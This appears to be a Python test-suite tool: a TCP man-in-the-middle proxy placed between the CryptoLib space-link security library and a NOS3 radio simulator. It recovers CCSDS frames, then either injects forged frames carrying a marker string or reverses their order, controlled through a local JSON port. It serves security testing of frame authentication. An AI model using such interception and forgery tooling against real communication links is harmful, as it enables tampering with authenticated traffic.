"""Suite-owned external TCP MITM for the CryptoLib--radio-sim boundary.

The proxy lives in the VM host network namespace.  It is deliberately not a
container-network or endpoint-namespace proxy: Docker is used only as the
existing privileged host-tool launcher.  TCP is a byte stream, therefore an
attack is enabled only after this module has recovered a complete protected
transfer frame using the NOS3 frame formats.
"""
from __future__ import annotations

import argparse
from dataclasses import dataclass, field
import hashlib
import json
from pathlib import Path
import selectors
import socket
import threading
import time
from typing import Callable


ASM = bytes.fromhex("1acffc1d")
TM_CADU_SIZE = 1790  # ASM (4) + TM_FRAME_DATA_SIZE (1786), from crypto_config.h


class FrameBoundaryError(ValueError):
    pass


@dataclass
class ProtectedFrameDecoder:
    direction: str
    buffer: bytearray = field(default_factory=bytearray)
    verified_frames: int = 0
    unsafe_reason: str | None = None

    def feed(self, data: bytes) -> list[bytes]:
        if self.unsafe_reason:
            return []
        self.buffer.extend(data)
        result: list[bytes] = []
        try:
            while True:
                size = self._next_size()
                if size is None:
                    break
                result.append(bytes(self.buffer[:size]))
                del self.buffer[:size]
                self.verified_frames += 1
        except FrameBoundaryError as error:
            self.unsafe_reason = str(error)
            raise
        return result

    def _next_size(self) -> int | None:
        if self.direction == "uplink":
            if len(self.buffer) < 5:
                return None
            # CCSDS TC primary-header frame length is the low 10 bits of
            # octets 2--3 and denotes length-minus-one.
            length = (((self.buffer[2] & 0x03) << 8) | self.buffer[3]) + 1
            if not 5 <= length <= 1024:
                raise FrameBoundaryError(f"invalid TC protected-frame length {length}")
            return length if len(self.buffer) >= length else None
        if len(self.buffer) < len(ASM):
            return None
        if self.buffer[:4] != ASM:
            raise FrameBoundaryError(
                "downlink stream lacks the configured TM CADU ASM 1acffc1d; "
                "a complete protected-frame boundary cannot be recovered"
            )
        return TM_CADU_SIZE if len(self.buffer) >= TM_CADU_SIZE else None


def fabricate_frame(frame: bytes, direction: str) -> bytes:
    """Return a complete but unauthenticated frame with attacker bytes.

    The length-bearing public transfer header is retained solely so the
    receiver consumes one complete frame; every security/payload/trailer byte
    is attacker controlled and no key or SA material is used.
    """
    header_len = 5 if direction == "uplink" else 4
    marker = b"RF-LINK-007-FORGED-WITHOUT-KEY"
    body = (marker * ((len(frame) - header_len + len(marker) - 1) // len(marker)))[: len(frame) - header_len]
    return frame[:header_len] + body


@dataclass
class AttackState:
    mode: str = "observe"                 # observe|fabricate|reorder
    direction: str = ""
    count: int = 0
    window: int = 4
    generation: int = 0


class JsonLog:
    def __init__(self, path: Path):
        self.path = path
        self.lock = threading.Lock()
        path.parent.mkdir(parents=True, exist_ok=True)

    def write(self, event: str, **fields: object) -> None:
        item = {"timestamp": time.time(), "event": event, **fields}
        with self.lock:
            with self.path.open("a", encoding="utf-8") as handle:
                handle.write(json.dumps(item, ensure_ascii=False, sort_keys=True) + "\n")


class BoundaryMitm:
    def __init__(self, *, uplink_target: tuple[str, int], downlink_target: tuple[str, int],
                 uplink_port: int, downlink_port: int, control_port: int, log: JsonLog):
        self.targets = {"uplink": uplink_target, "downlink": downlink_target}
        self.ports = {"uplink": uplink_port, "downlink": downlink_port}
        self.control_port = control_port
        self.log = log
        self.state = AttackState()
        self.state_lock = threading.Lock()
        self.stop_event = threading.Event()
        self.listeners: list[socket.socket] = []
        self.connections: dict[str, int] = {"uplink": 0, "downlink": 0}
        self.frames: dict[str, int] = {"uplink": 0, "downlink": 0}
        self.safe: dict[str, bool] = {"uplink": False, "downlink": False}
        self.unsafe: dict[str, str | None] = {"uplink": None, "downlink": None}

    def serve(self) -> None:
        for direction in ("uplink", "downlink"):
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind(("0.0.0.0", self.ports[direction]))
            listener.listen(4)
            self.listeners.append(listener)
            threading.Thread(target=self._accept_loop, args=(listener, direction), daemon=True).start()
        control = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        control.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        control.bind(("127.0.0.1", self.control_port))
        control.listen(8)
        self.listeners.append(control)
        threading.Thread(target=self._control_loop, args=(control,), daemon=True).start()
        self.log.write("session_listening", ports=self.ports, control_port=self.control_port,
                       placement="vm_host_network_external_mitm", endpoint_namespace_access=False)
        while not self.stop_event.wait(0.5):
            pass

    def snapshot(self) -> dict[str, object]:
        with self.state_lock:
            attack = self.state.__dict__.copy()
        return {"connections": self.connections.copy(), "recovered_frames": self.frames.copy(),
                "frame_boundary_safe": self.safe.copy(), "frame_boundary_unsafe_reason": self.unsafe.copy(),
                "attack": attack, "session_owner": "suite-owned-external-tcp-mitm",
                "placement": "vm_host_network_between_cryptolib_and_radio_sim",
                "endpoint_namespace_access": False, "process_restart": False}

    def _accept_loop(self, listener: socket.socket, direction: str) -> None:
        while not self.stop_event.is_set():
            try:
                client, peer = listener.accept()
            except OSError:
                return
            self.connections[direction] += 1
            self.log.write("receiver_connection_intercepted", direction=direction, peer=list(peer),
                           target=list(self.targets[direction]))
            threading.Thread(target=self._relay_connection, args=(client, direction), daemon=True).start()

    def _relay_connection(self, client: socket.socket, direction: str) -> None:
        target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            target.settimeout(30)
            target.connect(self.targets[direction])
            target.settimeout(None)
            self.log.write("receiver_socket_connected", direction=direction, target=list(self.targets[direction]))
            self._relay(client, target, direction)
        except Exception as error:
            self.log.write("relay_error", direction=direction, error=str(error))
        finally:
            client.close(); target.close()

    def _relay(self, client: socket.socket, target: socket.socket, direction: str) -> None:
        decoder = ProtectedFrameDecoder(direction)
        selector = selectors.DefaultSelector()
        selector.register(client, selectors.EVENT_READ, target)
        selector.register(target, selectors.EVENT_READ, client)
        reorder: list[tuple[int, bytes]] = []
        ordinal = 0
        while not self.stop_event.is_set():
            for key, _ in selector.select(0.5):
                source, destination = key.fileobj, key.data
                data = source.recv(8192)
                if not data:
                    return
                # Only the protected direction (client -> receiver target) is
                # parsed and manipulated.  Reverse TCP bytes are relayed raw.
                if source is not client:
                    destination.sendall(data)
                    continue
                try:
                    frames = decoder.feed(data)
                except FrameBoundaryError as error:
                    self.unsafe[direction] = str(error)
                    self.log.write("frame_boundary_unsafe", direction=direction, error=str(error))
                    destination.sendall(bytes(decoder.buffer)); decoder.buffer.clear()
                    continue
                if decoder.unsafe_reason:
                    destination.sendall(data)
                    continue
                for frame in frames:
                    ordinal += 1; self.frames[direction] += 1; self.safe[direction] = True
                    self.log.write("protected_frame_recovered", direction=direction, ordinal=ordinal,
                                   length=len(frame), sha256=hashlib.sha256(frame).hexdigest())
                    for output, kind in self._apply_attack(frame, direction, ordinal, reorder):
                        destination.sendall(output)
                        self.log.write("frame_sent_to_receiver_socket", direction=direction, ordinal=ordinal,
                                       kind=kind, length=len(output), sha256=hashlib.sha256(output).hexdigest(),
                                       receiver_socket_sendall=True)

    def _apply_attack(self, frame: bytes, direction: str, ordinal: int,
                      reorder: list[tuple[int, bytes]]) -> list[tuple[bytes, str]]:
        with self.state_lock:
            state = AttackState(**self.state.__dict__)
            enabled = state.direction == direction and state.count > 0
            if enabled and state.mode == "fabricate":
                self.state.count -= 1
            if enabled and state.mode == "reorder":
                self.state.count -= 1
        if not enabled:
            return [(frame, "normal")]
        if state.mode == "fabricate":
            forged = fabricate_frame(frame, direction)
            self.log.write("complete_forged_frame_created", direction=direction, source_ordinal=ordinal,
                           length=len(forged), sha256=hashlib.sha256(forged).hexdigest(),
                           no_key_or_sa_used=True)
            return [(forged, "forged"), (frame, "normal")]
        if state.mode == "reorder":
            reorder.append((ordinal, frame))
            if len(reorder) < state.window:
                return []
            original = [number for number, _ in reorder]
            reordered = list(reversed(reorder)); reorder.clear()
            self.log.write("complete_frames_reordered", direction=direction, original_order=original,
                           forwarded_order=[number for number, _ in reordered], order_changed=original != [number for number, _ in reordered])
            return [(payload, "reordered") for _, payload in reordered]
        return [(frame, "normal")]

    def _control_loop(self, listener: socket.socket) -> None:
        while not self.stop_event.is_set():
            try:
                conn, _ = listener.accept()
            except OSError:
                return
            with conn:
                try:
                    request = json.loads(conn.recv(4096).decode("utf-8"))
                    action = str(request.get("action", "snapshot"))
                    if action == "set":
                        mode = str(request["mode"]); direction = str(request["direction"])
                        if mode not in {"fabricate", "reorder", "observe"} or direction not in self.targets:
                            raise ValueError("invalid mode or direction")
                        with self.state_lock:
                            self.state = AttackState(mode=mode, direction=direction, count=int(request.get("count", 0)),
                                                     window=int(request.get("window", 4)), generation=self.state.generation + 1)
                        self.log.write("attack_configuration", **self.state.__dict__)
                    elif action == "stop":
                        self.stop_event.set()
                    conn.sendall(json.dumps(self.snapshot()).encode("utf-8"))
                except Exception as error:
                    conn.sendall(json.dumps({"error": str(error)}).encode("utf-8"))


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--uplink-target", required=True); parser.add_argument("--downlink-target", required=True)
    parser.add_argument("--uplink-port", type=int, default=18010); parser.add_argument("--downlink-port", type=int, default=18011)
    parser.add_argument("--control-port", type=int, default=18990); parser.add_argument("--log", type=Path, required=True)
    args = parser.parse_args()
    def endpoint(value: str) -> tuple[str, int]:
        host, port = value.rsplit(":", 1); return host, int(port)
    BoundaryMitm(uplink_target=endpoint(args.uplink_target), downlink_target=endpoint(args.downlink_target),
                 uplink_port=args.uplink_port, downlink_port=args.downlink_port,
                 control_port=args.control_port, log=JsonLog(args.log)).serve()


if __name__ == "__main__":
    main()
